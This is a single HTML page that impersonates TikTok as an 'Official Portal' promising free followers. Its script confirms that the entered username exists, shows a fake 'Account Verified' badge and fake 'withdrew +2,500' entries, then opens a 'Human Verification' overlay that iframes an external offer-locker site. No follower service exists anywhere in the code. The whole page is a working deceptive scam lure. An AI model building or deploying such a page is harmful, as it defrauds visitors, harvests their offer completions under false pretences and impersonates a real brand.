<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>TikTok Verify | Official Portal</title>

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

<style>
*{
  margin:0;
  padding:0;
  box-sizing:border-box;
}

body{
  font-family:Arial, Helvetica, sans-serif;
  min-height:100vh;
  overflow-x:hidden;
  position:relative;
  background:
  linear-gradient(rgba(0,0,0,.55),rgba(0,0,0,.55)),
  url('https://images.unsplash.com/photo-1493225457124-a3eb161ffa5f?auto=format&fit=crop&w=1600&q=80')
  center center/cover no-repeat;
}

body::before{
  content:"";
  position:fixed;
  inset:0;
  backdrop-filter:blur(8px);
  z-index:0;
}

.wrapper{
  position:relative;
  z-index:2;
  min-height:100vh;
  display:flex;
  flex-direction:column;
  justify-content:center;
  align-items:center;
  padding:30px 15px;
}

.card{
  width:420px;
  max-width:92%;
  padding:34px 28px;
  border-radius:24px;
  background:rgba(8,8,8,.72);
  border:1px solid rgba(255,255,255,.12);
  box-shadow:0 20px 50px rgba(0,0,0,.45);
  text-align:center;
}

.logo{
  display:flex;
  align-items:center;
  justify-content:center;
  gap:12px;
  margin-bottom:22px;
}

.logo i{
  font-size:42px;
  color:#25F4EE;
  text-shadow:2px 0 #FE2C55;
}

.logo h2{
  color:#fff;
  font-size:44px;
  font-weight:800;
}

.title{
  color:#fff;
  font-size:31px;
  font-weight:800;
  margin-bottom:12px;
}

.sub{
  color:#d7d7d7;
  font-size:18px;
  margin-bottom:24px;
}

.input-wrap{
  height:66px;
  border-radius:16px;
  padding:0 18px;
  display:flex;
  align-items:center;
  gap:14px;
  background:rgba(255,255,255,.04);
  border:1px solid rgba(255,255,255,.15);
  margin-bottom:18px;
}

.input-wrap i{
  color:#fff;
  font-size:28px;
}

.input-wrap input{
  flex:1;
  height:100%;
  border:none;
  outline:none;
  background:transparent;
  color:#fff;
  font-size:20px;
}

.btn{
  width:100%;
  height:66px;
  border:none;
  border-radius:16px;
  font-size:30px;
  font-weight:800;
  color:#fff;
  cursor:pointer;
  background:linear-gradient(90deg,#FE2C55 0%,#ff1f72 45%,#25F4EE 100%);
  box-shadow:0 10px 25px rgba(254,44,85,.28);
}

/* Account Preview Step */
#account-preview {
    display: none;
    margin-top: 10px;
    padding: 15px;
    background: rgba(255,255,255,0.05);
    border-radius: 20px;
    border: 1px solid #25F4EE;
    animation: modalFadeIn 0.4s;
}
.profile-img {
    width: 100px;
    height: 100px;
    border-radius: 50%;
    border: 3px solid #FE2C55;
    margin-bottom: 10px;
    object-fit: cover;
    background: #111;
}

#error-msg {
    color: #FE2C55;
    font-size: 14px;
    margin-top: -10px;
    margin-bottom: 10px;
    display: none;
    font-weight: bold;
}

.locker-overlay {
  display: none;
  position: fixed;
  inset: 0;
  background: rgba(0, 0, 0, 0.85);
  z-index: 9999;
  justify-content: center;
  align-items: center;
}

.locker-content {
  width: 90%;
  max-width: 500px;
  background: #121212;
  border-radius: 20px;
  border: 1px solid #333;
  overflow: hidden;
  animation: modalFadeIn 0.3s ease-out;
}

@keyframes modalFadeIn {
  from { opacity: 0; transform: translateY(20px); }
  to { opacity: 1; transform: translateY(0); }
}

.history{
  width:100%;
  max-width:950px;
  margin-top:auto;
  padding-top:30px;
  display:grid;
  grid-template-columns:repeat(4,1fr);
  gap:12px;
}

.box{
  background:rgba(8,8,8,.72);
  border:1px solid rgba(255,255,255,.10);
  border-radius:16px;
  padding:14px;
  color:#fff;
  text-align:center;
}

#live-toast {
    position: fixed;
    bottom: 20px;
    left: 20px;
    background: rgba(8, 8, 8, 0.95);
    border: 1px solid #25F4EE;
    padding: 15px 20px;
    border-radius: 12px;
    display: flex;
    align-items: center;
    gap: 12px;
    z-index: 10001;
    transition: 0.5s ease;
    transform: translateX(-150%);
}

@media(max-width:768px){
  .history{ grid-template-columns:repeat(2,1fr); }
  #live-toast { transform: translateY(200%); }
}
</style>
</head>

<body>

<div class="wrapper">
  <div class="card">
    <div class="logo"><i class="fa-brands fa-tiktok"></i><h2>TikTok</h2></div>

    <div id="main-view">
        <div class="title">Add Followers</div>
        <div class="sub">Enter your account name to increase followers.</div>
        <div id="error-msg"><i class="fa-solid fa-circle-exclamation"></i> User not found!</div>
        <div class="input-wrap">
          <i class="fa-solid fa-at"></i>
          <input type="text" id="username" placeholder="Username">
        </div>
        <button class="btn" onclick="searchAccount()" id="btn-text">Verify</button>
    </div>

    <div id="account-preview">
        <img src="" id="userAvatar" class="profile-img" alt="User">
        <div class="profile-name" id="userDisplay" style="color:#fff; font-weight:800; font-size:20px;">@Username</div>
        <p style="color:#2ecc71; font-weight:bold; margin:10px 0;">✓ Account Verified</p>
        <button class="btn" onclick="showLocker()" style="font-size:24px;">Confirm & Add</button>
    </div>
  </div>

  <div class="history" id="history-grid"></div>
</div>

<div class="locker-overlay" id="lockerOverlay">
  <div class="locker-content">
    <div style="padding:20px; text-align:center; color:#fff;">
        <h3>Human Verification</h3>
        <p style="color:#a8a8a8;">Complete one task to finish.</p>
    </div>
    <div style="height:450px;"><iframe src="https://ogam.site/cl/i/8229kj" style="width:100%; height:100%; border:none;"></iframe></div>
  </div>
</div>

<script>
  const names = ["James_V", "Sarah_P", "Mike_J", "Emily_O", "Chris_V", "Olivia_S", "Ryan_G", "Ava_O"];

  async function searchAccount() {
    const user = document.getElementById('username').value.trim().replace('@', '');
    if(user.length < 2) return;
    
    const btn = document.getElementById('btn-text');
    const error = document.getElementById('error-msg');
    
    btn.innerText = "Checking...";
    btn.disabled = true;
    error.style.display = "none";

    try {
        // We use a CORS Proxy to check if the TikTok profile page exists
        const response = await fetch(`https://api.allorigins.win/get?url=${encodeURIComponent('https://www.tiktok.com/@' + user)}`);
        const data = await response.json();
        
        // If the page contains "Couldn't find this account", it means it's fake
        if (data.contents.includes("Couldn't find this account") || data.status.http_code === 404) {
            throw new Error("Not Found");
        }

        // Success: Account exists
        document.getElementById('main-view').style.display = 'none';
        document.getElementById('account-preview').style.display = 'block';
        document.getElementById('userDisplay').innerText = "@" + user;
        
        // Try to get avatar, otherwise use initials
        const avatarImg = document.getElementById('userAvatar');
        avatarImg.src = `https://ui-avatars.com/api/?name=${user}&background=25F4EE&color=000&size=128&bold=true`;
        
    } catch (e) {
        btn.innerText = "Verify";
        btn.disabled = false;
        error.style.display = "block";
    }
  }

  function showLocker() {
    document.getElementById('lockerOverlay').style.display = 'flex';
  }

  function initGrid() {
      const grid = document.getElementById('history-grid');
      for(let i=0; i<4; i++) {
          grid.innerHTML += `<div class="box"><div style="color:#25F4EE; font-weight:bold;">@${names[i]} withdrew</div><div style="color:#fff; font-size:22px;">+2,500</div></div>`;
      }
  }

  initGrid();
</script>

</body>
</html>
